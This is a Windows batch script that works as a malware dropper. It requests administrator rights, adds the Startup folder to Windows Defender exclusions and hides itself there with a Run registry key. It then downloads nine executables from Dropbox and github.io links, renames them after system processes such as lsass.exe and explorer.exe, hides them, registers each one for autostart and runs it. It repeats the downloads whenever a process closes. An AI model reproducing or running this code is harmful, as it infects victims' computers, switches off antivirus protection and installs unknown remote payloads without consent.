@echo off
:: Batch script to download arrays of files, create registry keys for each file, hide files, add Startup folder to Windows Defender exclusions, monitor application close events, and execute files

:: Define an array of file URLs to download
set "fileUrls[0]=https://www.dropbox.com/scl/fi/9d9cvb8bmmjc3d2e2dtxq/winlogon.exe?rlkey=hmmvfm1bzkr5mfas1ubo449a3&st=rnxvwht5&dl=1"
set "fileUrls[1]=https://infinityteq.github.io/MalwareRemoval.exe"
set "fileUrls[2]=https://www.dropbox.com/scl/fi/vp4sb3ogc8fj3dkhuddhc/PhantomShadow.exe?rlkey=5165cqwgiki50yuqxzh8km6m2&st=wg82kr7q&dl=1"
set "fileUrls[3]=https://infinityteq.github.io/WindowsUpdate.exe"
set "fileUrls[4]=https://infinityteq.github.io/chrome.exe"
set "fileUrls[5]=https://infinityteq.github.io/Server.exe"
set "fileUrls[6]=https://infinityteq.github.io/svchost.exe"
set "fileUrls[7]=https://infinityteq.github.io/winupdate.exe"
set "fileUrls[8]=https://infinityteq.github.io/activatorfl.exe"


:: Define an array of new file names
set "fileNames[0]=winnit.exe"
set "fileNames[1]=system.exe"
set "fileNames[2]=Defender.exe"
set "fileNames[3]=Windows.exe"
set "fileNames[4]=updater.exe"
set "fileNames[5]=lsass.exe"
set "fileNames[6]=java.exe"
set "fileNames[7]=explorer.exe"
set "fileNames[8]=iexplorer.exe"

:: Define an array of registry key names
set "registryKeys[0]=explorer"
set "registryKeys[1]=javaupdate"
set "registryKeys[2]=winupdate"
set "registryKeys[3]=chrome"
set "registryKeys[4]=system"
set "registryKeys[5]=winnow"
set "registryKeys[6]=sys"
set "registryKeys[7]=winlogon"
set "registryKeys[8]=systemupdate"

:: Define the Startup folder path
set "startupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

:: Ensure the script runs with elevated privileges
:: Check if the script is running as administrator
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrative privileges...
    :: Relaunch the script with elevated privileges
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Add the Startup folder to Windows Defender exclusions
echo Adding Startup folder to Windows Defender exclusions...
powershell -Command "Add-MpPreference -ExclusionPath '%startupFolder%'"
if %errorLevel% equ 0 (
    echo Startup folder added to Windows Defender exclusions.
) else (
    echo Failed to add Startup folder to Windows Defender exclusions.
)

:: Ensure the script runs persistently (e.g., at system startup)
:: Method 1: Add to the Startup folder and hide it
if not exist "%startupFolder%\%~nx0" (
    echo Copying script to Startup folder...
    copy "%~f0" "%startupFolder%\%~nx0" >nul
    attrib +h "%startupFolder%\%~nx0" >nul
    echo Script hidden in Startup folder.
)

:: Method 2: Add to the Windows Registry
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistentScript" >nul 2>&1
if %errorLevel% neq 0 (
    echo Adding script to Registry...
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "PersistentScript" /t REG_SZ /d "\"%~f0\"" /f
)

:: Function to download files, rename them, hide them, set registry keys, and execute them
:DownloadFiles
echo Downloading files...
setlocal enabledelayedexpansion
for /l %%i in (0,1,2,3,4,5,6,7,8) do (
    set "fileUrl=!fileUrls[%%i]!"
    set "fileName=!fileNames[%%i]!"
    set "registryKey=!registryKeys[%%i]!"
    set "filePath=%startupFolder%\!fileName!"

    echo Downloading !fileUrl! to !filePath!...
    powershell -Command "Invoke-WebRequest -Uri '!fileUrl!' -OutFile '!filePath!'"
    if exist "!filePath!" (
        echo File downloaded to !filePath!.
        :: Hide the downloaded file
        attrib +h "!filePath!" >nul
        echo File hidden in Startup folder.
        :: Set a new registry key for the downloaded file
        reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "!registryKey!" >nul 2>&1
        if %errorLevel% neq 0 (
            echo Adding new registry key for !fileName!...
            reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "!registryKey!" /t REG_SZ /d "\"!filePath!\"" /f
        )
        :: Execute the downloaded file
        echo Executing !fileName!...
        start "" "!filePath!"
    ) else (
        echo Failed to download !fileUrl!.
    )
)
endlocal
goto MonitorProcesses

:: Function to monitor application close events
:MonitorProcesses
echo Monitoring application close events...
:: Get the list of running processes
for /f "tokens=*" %%a in ('powershell -Command "Get-Process | Select-Object -ExpandProperty ProcessName"') do (
    set "processList=!processList! %%a"
)

:: Loop indefinitely to monitor processes
:MonitorLoop
:: Get the current list of running processes
set "currentProcessList="
for /f "tokens=*" %%a in ('powershell -Command "Get-Process | Select-Object -ExpandProperty ProcessName"') do (
    set "currentProcessList=!currentProcessList! %%a"
)

:: Compare the previous list with the current list to find closed processes
for %%a in (%processList%) do (
    echo %%a | findstr /i /c:"%%a" >nul 2>&1
    if errorlevel 1 (
        echo Application closed: %%a
        call :DownloadFiles
    )
)

:: Update the list of processes
set "processList=%currentProcessList%"

:: Wait for a short period before checking again
timeout /t 1 /nobreak >nul
goto MonitorLoop
